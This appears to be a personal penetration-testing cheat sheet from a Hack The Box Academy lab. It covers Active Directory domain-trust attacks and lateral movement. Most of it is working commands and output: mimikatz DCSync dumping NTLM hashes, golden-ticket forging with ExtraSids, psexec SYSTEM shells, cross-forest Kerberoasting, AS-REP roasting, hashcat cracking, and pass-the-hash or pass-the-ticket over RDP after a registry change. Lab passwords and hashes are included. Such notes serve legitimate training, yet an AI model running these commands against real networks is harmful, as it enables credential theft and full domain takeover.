g78hZ8IYL+Y4LPEpiQzM8JsXqUdQtiJXM3Eig6RulSxCo9rc5YUWTaHx/i3PfWqP+dNREtldE2sgIUQm

9f3cO1aOCt517Mmo7lICBFXUTQJvfGFtYdc01fWLoN45AtdpJro81GwihIFMcp/vmPBlqQGxAtRKzgzY

acuk8YYogiP6815+x4vSZEL2JOJyLXSW0OPhguYSqAIEQshOkBm2p2jahQWYvCPPDd/EFM7S3NdMnJOz

X3P7ObzVTAPQ/o9lSaXlopQH6L46z6PTcC/4GwaRbqVnm1RU0O3VpVr5bgaR+Nas5VYGBYIHOw3Qx5YT

3dtLvCxNa3cEgllr9N0BjCl1iQGWyFo72JYI9JLV0VAjnyRxFqHztiSctDExnwqWiyDaGET31PRdEz+H

WlAi4Y56GaDPrSZFS1RHofKqehMQD6gNrIxWPHdS9aiMAnhQth8GKbLqimcVrCUG+eghE+CN999gHNMG

Be1Vnz8Oc3DIM9FNLFVZiqJrAvsq2paakZnjf5HXOZ6EdqWkwiWpbGXv4qyuZ8jnUyHxavOOPDAHdVeo

/RIfLx12GlLzN5y7132Rj4iZlkVgAyB6+PIpjuDLDSq6UJnHRkYlJ/3l5j0KxgjdZbwoFbC7p76IPC3B

aY97mXatvMfrrc/Aw5JaIFSaOYQ8M/frCG738e90IK/2eTFZD9/kKXDgmwMowBEmT3IWj9lgOixNcNV/

OPbuqR9QiT4psvzLGmd0jxu4JSm8Usw5iBiIuW/pwcHKFgL1hCBEtUkaWH24fuJuAIdei0r9DolImqC3

sERVQ5VSc7u4oaAIyv7Acq+UrPMwnrkDrB6C7WBXiuoBAzPQULPTWih6LyAwenrpd0sOEOiPvh8NlvIH

eOhKwWOY6GVpVWEShRLDl9/XLxdnRfnNZgn2SvHOAJfYbRgRHMWAfzA+2+xps6WS/NNf1vZtUV/KRLlW

sL5v91jmzGiZQcENkLeozZ7kIsY/zadFqVnrnQqsd97qcLYktZ4yOYpxH43JYS2e+cXZ+NXLKxex37HQ

F5aNP7EITdjQds0lbyb9K/iUY27iyw7dRVLz3y5Dic4S4+cvJBSz6Y1zJHpLkDfYVQbBUCfUps8ImJij

Hf+jggEhMIIBHaADAgEAooIBFASCARB9ggEMMIIBCKCCAQQwggEAMIH9oBswGaADAgEXoRIEEBrCyB2T

JTKolmppTTXOXQShHxsdTE9HSVNUSUNTLklOTEFORUZSRUlHSFQuTE9DQUyiEzARoAMCAQGhCjAIGwZo

YWNrZXKjBwMFAEDgAACkERgPMjAyMjAzMjkxNzA2NDFapREYDzIwMjIwMzI5MTcwNjQxWqYRGA8yMDIy

MDMzMDAzMDY0MVqnERgPMjAyMjA0MDUxNzA2NDFaqB8bHUxPR0lTVElDUy5JTkxBTkVGUkVJR0hULkxP

Q0FMqTIwMKADAgECoSkwJxsGa3JidGd0Gx1MT0dJU1RJQ1MuSU5MQU5FRlJFSUdIVC5MT0NBTA==

[+] Ticket successfully imported!

```


## DCSync attack on Parent Domain  

Once creating a golden ticket we are allow to perfom a DCSync attack on a parent domain. In this example targeting  `lab_adm` Domain Admin user .

```bash

PS C:\Tools\mimikatz\x64> .\mimikatz.exe

mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm

[DC] 'INLANEFREIGHT.LOCAL' will be the domain

[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server

[DC] 'INLANEFREIGHT\lab_adm' will be the user account

[rpc] Service  : ldap

[rpc] AuthnSvc : GSS_NEGOTIATE (9)



Object RDN           : lab_adm



** SAM ACCOUNT **


SAM Username         : lab_adm

Account Type         : 30000000 ( USER_OBJECT )

User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )

Account expiration   :

Password last change : 2/27/2022 10:53:21 PM

Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1001

Object Relative ID   : 1001



Credentials:

Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6

ntlm- 0: 663715a1a8b957e8e9943cc98ea451b6

ntlm- 1: 663715a1a8b957e8e9943cc98ea451b6

lm  - 0: 6053227db44e996fe16b107d9d1e95a0

```

When dealing with multiple domains and our target domain is not the same as the user's domain, we will need to specify the **exact domain** to perform the DCSync operation on the particular domain controller. The command for this would look like the following:  


```bash

mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL



[DC] 'INLANEFREIGHT.LOCAL' will be the domain

[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server

[DC] 'INLANEFREIGHT\lab_adm' will be the user account

[rpc] Service  : ldap

[rpc] AuthnSvc : GSS_NEGOTIATE (9)



Object RDN           : lab_adm



** SAM ACCOUNT **



SAM Username         : lab_adm

Account Type         : 30000000 ( USER_OBJECT )

User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )

Account expiration   :

Password last change : 2/27/2022 10:53:21 PM

Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1001

Object Relative ID   : 1001



Credentials:

Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6

ntlm- 0: 663715a1a8b957e8e9943cc98ea451b6

ntlm- 1: 663715a1a8b957e8e9943cc98ea451b6

lm  - 0: 6053227db44e996fe16b107d9d1e95a0

```

# ExtraSids Attack - Linux

## Retrivie the krbtgt HASH
```bash
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```


## Retrieve the SID of the child domain

```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@10.129.116.255

```

## Retrieve the SID of the Enterprise Admins group in Parent domain

```bash

lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

```

## Constructing a Golden Ticket using ticketer.py  


```bash

ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 CappuccinoAssassino

```

## Setting the KRB5CCNAME Environment Variable
```bash
export KRB5CCNAME=CappuccinoAssassino.ccache
```

## Getting a SYSTEM shell using Impacket's psexec.py

```bash
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/CappuccinoAssassino@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL -k -no-pass -target-ip 172.16.5.5
```


## Automate PWND with raiseChild.py

```bash
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```


## Perfrom a DCSync attack to the parent domain

```bash
secretsdump.py logistics.inlanefreight.local/CappuccinoAssassino@academy-ea-dc01.inlanefreight.local -k -no-pass -just-dc-user INLANEFREIGHT/bross
```

# Kerberoasting Attack Domain Trust Cross-Forest - Windows

Enumerating Accounts for Associated **SPNs** Using **Get-DomainUser**

```bash
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```

Enumerating the founded Account

```bash
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
```

Use Rubeus with the **/domain:** flag to specify the target domain
```bash
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```

## Foreign group membership

From time to time, we'll run into a situation where there is a bidirectional forest trust managed by admins from the same company. If we can take over Domain A and obtain cleartext passwords or NT hashes for either the built-in Administrator account (or an account that is part of the Enterprise Admins or Domain Admins group in Domain A), and Domain B has a highly privileged account with the same name, then it is worth checking for password reuse across the two forests.

Using **Get-DomainForeignGroupMember**  to enumerate groups with users that do not belong to the domain, also known as foreign group membership.

```bash
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
```

# Kerberoasting Attack Domain Trust Cross-Forest - Linux

Enumerating Accounts for Associated **SPNs** Using **GetUserSPNs.py**

```bash
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/htb-student
```

perform a kerberoasting attack with the `-request` flag.

```bash
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/htb-student -outputfile TGS_hash
```

Connect to the target domain using **psexec.py**

```bash
psexec.py FREIGHTLOGISTICS.LOCAL/sapsso:pabloPICASSO@ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
```


## Do not require Kerberos preauthentication 
I a object in AD have this flag means we can utilize the [**GetNPUsers**.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py) script to ask **TGS** ticket for users that have **Do not require Kerberos preauthentication** set.

```bash
GetNPUsers.py htb.local/svc-alfresco -dc-ip 10.129.211.144 -no-pass -format hashcat
```
# Hashcat

### NTLMv2
```
sudo hashcat -m 5600 smb_pwd.txt /usr/share/wordlists/rockyou.txt
```
### TGS Kerberos Ticker

```bash
sudo hashcat -m 13100 SAPService_tgs /usr/share/wordlists/rockyou.txt
```


# Windows Lateral Movement
## Restricted Admin Mode
Restricted Admin Mode is a security feature introduced by Microsoft to mitigate the risk of credential theft over RDP connections. When enabled, it performs a network logon rather than an interactive logon, preventing the caching of credentials on the remote system. This mode only applies to administrators, so it cannot be used when you log on to a remote computer with a non-admin account.

Although this mode prevents the caching of credentials, if enabled, it allows the execution of `Pass the Hash` or `Pass the Ticket` for lateral movement.

To confirm if `Restricted Admin Mode` is enabled, we can query the following registry key:
```cmd
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin
```
The value of `DisableRestrictedAdmin` indicates the status of `Restricted Admin Mode`:

- If the value is `0`, `Restricted Admin Mode` is enabled.
- If the value is `1`, `Restricted Admin Mode` is disabled.

If the key does not exist it means that is disabled.

Additionally, to enable `Restricted Admin Mode`, we would set the `DisableRestrictedAdmin` value to `0`. Here is the command to enable it:

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD
```

And to disable `Restricted Admin Mode`, set the `DisableRestrictedAdmin` value to `1`:

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 1 /t REG_DWORD
```

## Pass the Hash and Pass the ticket for RDP
If the `Restricted Admin Mode` is enable we can abuse this to authenticate using **hash** or **ticket**.

To perform `Pass the Hash` from a Linux machine, we can use `xfreerdp` with the `/pth` option to use a hash and connect to RDP. Here's an example command:

```bash
proxychains4 -q xfreerdp /u:helen /pth:62EBA30320E250ECA185AA1327E78AEB /d:inlanefreight.local /v:172.20.0.52
[13:11:55:443] [84886:84887] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[13:11:55:444] [84886:84887] [WARN][com.freerdp.crypto] - CN = SRV02.inlanefreight.local
```

For `Pass the Ticket` we can use [Rubeus](https://github.com/GhostPack/Rubeus). We will forge a ticket using `Helen`'s hash. First we need to launch a sacrificial process with the option `createnetonly`:

```powershell
.\Rubeus.exe createnetonly /program:powershell.exe /show
```

In the new PowerShell window we will use User's hash to forge a Ticket-Granting ticket (TGT):

```powershell-session
.\Rubeus.exe asktgt /user:<insert-the-user> /rc4:62EBA30320E250ECA185AA1327E78AEB /domain:inlanefreight.local /ptt
```

From the powershell session were we have imported the TGT we can use `mstsc /restrictedAdmin`:

```powershell
C:\Tools> mstsc.exe /restrictedAdmin
```

It will open a window as the currently logged-in user. **It doesn't matter if the name is not the same as the account we are trying to impersonate.**

![text](https://academy.hackthebox.com/storage/modules/263/mstsc-restrictedadmin.png)

When we click login, it will allow us to connect to RDP using the hash:

![text](https://academy.hackthebox.com/storage/modules/263/mstsc-rdp-with-ticket.png)

# Connection

## XfreeRDP

This xfreerdp connection is optimize for low latency networks or Proxy Connections
```bash
xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux /bpp:16 /compression -themes -wallpaper /clipboard +clipboard /audio-mode:0
```

in this command:

- `/bpp:8`: Reduces the color depth to 8 bits per pixel, decreasing the amount of data transmitted.
- `/compression`: Enables compression to reduce the amount of data sent over the network.
- `-themes`: Disables desktop themes to reduce graphical data.
- `-wallpaper`: Disables the desktop wallpaper to further reduce graphical data.
- `/clipboard`: Enables clipboard sharing between the local and remote machines.
- `/audio-mode:0`: Disables audio redirection to save bandwidth.